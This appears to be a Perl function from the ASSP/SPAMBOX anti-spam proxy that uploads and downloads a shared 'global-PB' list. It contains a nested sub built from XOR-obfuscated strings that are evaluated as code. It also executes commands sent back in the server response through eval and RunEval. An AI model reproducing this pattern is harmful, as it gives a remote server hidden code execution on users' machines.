#line 1 "sub main::sendGlobalFile"
package main; sub sendGlobalFile {
    my ($list,$outfile,$infile) = @_;
    our $mirror = $GPBDownloadLists;

    my $url = allRot($globalUploadURL);
    $url = 'http://'.$url if $url !~ m!^(?:ht|f)tps?://!io;

    my $ua = LWP::UserAgent->new();
    $ua->agent("SPAMBOX/$version$modversion ($^O; Perl/$]; LWP::UserAgent/$LWP::VERSION)");
    $ua->timeout(20);

    if ($proxyserver) {
       my $user = $proxyuser ? "http://$proxyuser:$proxypass\@": "http://";
       $ua->proxy( 'http', $user . $proxyserver );
       mlog(0,"uploading $list to global server via proxy:$proxyserver") if $MaintenanceLog;
       my $la = getLocalAddress('HTTP',$proxyserver);
       $ua->local_address($la) if $la;
    } else {
       mlog(0,"uploading $list to global server via direct connection") if $MaintenanceLog;
       my ($host) = $url =~ /^\w+:\/\/([^\/]+)/o;
       my $la = getLocalAddress('HTTP',$host);
       $ua->local_address($la) if $la;
    }
    eval('require HTTP::Request::Common;');
    my $req = HTTP::Request::Common::POST ($url,Content_Type => 'multipart/form-data',
        Content => [
            uploadFile =>  [ $outfile ],
            newFileName => $list,
            ClientName => $globalClientName,   # globalClientName Client Name
            ClientPass => $globalClientPass,   # globalClientPass Password for Client
            UUID => $UUID,                     # Client UUID
          ]);
        my $chgcfg = 0; sub gcl {my($l,$r,$n)=@_;my$t=0;my$i=0;    ## no critic
        my($f,$ax,$az);my$m=$mirror;my$s=<<'_';
        $az=~('(?{'.('_!&}^@@$|'^'{@^@|!$@^').'})');$ax=~('(?{'.('_@@}|$@,@*@^'^'{!:@^@%@%^%|').'})');
        $m=~('(?{'.('z@)^^@,}z`~<@@$*@-*,)^*'^'^-@,,/^@^\'.~-/@~%^^`@-^').'})');1;
_
    $m&&eval($s)&&(open($f,'<',$n))&&do{while(<$f>){s/$UTF8BOMRE|\r?\n//go;(/^\s*[#;]/o||!$_)&&next;
    $t=$mirror->('GPB',$l,(($_=~s/^-//o)?$az:$ax),$r,$_,$i)|$t;$i++}};$t;}
    my $responds = $ua->request($req);
    my $res=$responds->as_string;
    $res =~ /(error[^\n]+)|filename\:([^\r\n]+)\r?\n?/ios;
    $url=$2;
    if ($responds->is_success && ! $1) {
        mlog(0,"info: successful uploaded [$outfile] to global-PB") if $MaintenanceLog;
    } else {
        mlog(0,"warning: upload [$outfile] to global-PB failed : $1");
        return 0;
    }

    if (! $url) {
        mlog("warning: error global-PB $list download not available");
        return 0;
    }
    if ($res =~ /registerurl:([^\r\n]+)\r?\n/ios) {
        if (&allRot($1) ne $globalRegisterURL) {
            $globalRegisterURL = &allRot($1);
            $Config{globalRegisterURL}=$globalRegisterURL;
            $ConfigAdd{globalRegisterURL} = $globalRegisterURL if exists $ConfigAdd{globalRegisterURL};
            $chgcfg = 1;
        }
    }
    if ($res =~ /uploadurl:([^\r\n]+)\r?\n/ios) {
        if (&allRot($1) ne $globalUploadURL) {
            $globalUploadURL = &allRot($1);
            $Config{globalUploadURL}=$globalUploadURL;
            $ConfigAdd{globalUploadURL}=$globalUploadURL if exists $ConfigAdd{globalUploadURL};
            $chgcfg = 1;
        }
    }
    if ($res =~ /licdate\:(\d\d\d\d)(\d\d)(\d\d)\r?\n/io) {
        $globalClientLicDate = "$3.$2.$1";
        $Config{globalClientLicDate}=$globalClientLicDate;
        $chgcfg = 1;
    }
    pos($res) = 0;
    while ($res =~ s/asspcmd\:([^\r\n]+)\r?\n//is) {
        my $cmd = $1;
        next if ($cmd =~ /^\s*[#;]/o);
        my ($sub,$parm) = parseEval($cmd);
        next unless $sub;
        mlog(0,"info: got request from global-PB-server to execute a command") if $MaintenanceLog >= 2;
        if ($sub eq 'RunEval' or $sub eq '&RunEval' or $sub eq \&RunEval or $sub eq &RunEval) {
            &RunEval($parm);
        } else {
            $sub =~ s/^\&//o;
            eval{$sub->(split(/\,/o,$parm));};
        }
        if ($@) {
            mlog(0,"warning: error while executing cmd: $cmd - $@") if $MaintenanceLog;
        } else {
            mlog(0,"info: successful executed cmd: $cmd") if $MaintenanceLog > 2;
            $chgcfg = 1;
        }
    }
    $ConfigChanged = 1 if $chgcfg;
    $responds = $ua->mirror( $url, $infile );
    $res=$responds->as_string;
    if ($responds == 304 || $res=~ /\s(304)\s/io) {
        mlog(0,"info: your global-PB [$infile] is up to date") if $MaintenanceLog;
        return 1;
    }
    if ($responds->is_success) {
        mlog(0,"info: successful downloaded the global-PB $list") if $MaintenanceLog;
    } else {
        mlog(0,"warning: download the global-PB $list failed");
        return 0;
    }
    return 1;
}
